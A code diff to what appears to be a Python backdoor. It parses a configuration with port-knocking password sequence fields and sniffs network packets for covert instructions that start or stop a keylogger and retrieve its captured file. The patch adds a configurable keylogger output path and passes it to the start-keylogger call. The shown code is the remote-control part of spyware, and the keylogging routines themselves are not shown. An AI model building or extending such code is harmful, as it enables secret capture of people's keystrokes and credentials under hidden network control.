@@ -53,6 +53,7 @@ class Configuration:
         self.port_knock_password_seq_num = ''
         self.delimiter = ''
         self.storage_path = ''
+        self.keylogger_path = ''
 
         with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
             fp = [line.rstrip('\n') for line in file]
@@ -85,6 +86,8 @@ class Configuration:
                     self.delimiter = config_data[1]
                 elif config_data[0] == 'storage_path':
                     self.storage_path = config_data[1]
+                elif config_data[0] == 'keylogger_path':
+                    self.keylogger_path = config_data[1]
 
     def update_port_knock_password_seq_num(self):
         self.port_knock_password_seq_num = str(int(self.port_knock_password_seq_num) + 1)
@@ -252,7 +255,7 @@ def process_sniff_pkt(pkt):
         instruction = commands[2]
         if instruction == "1":
             print(instruction)
-            utils.start_keylogger()
+            utils.start_keylogger(config.keylogger_path)
         elif instruction == "2":
             print(instruction)
             file_path = utils.stop_keylogger()
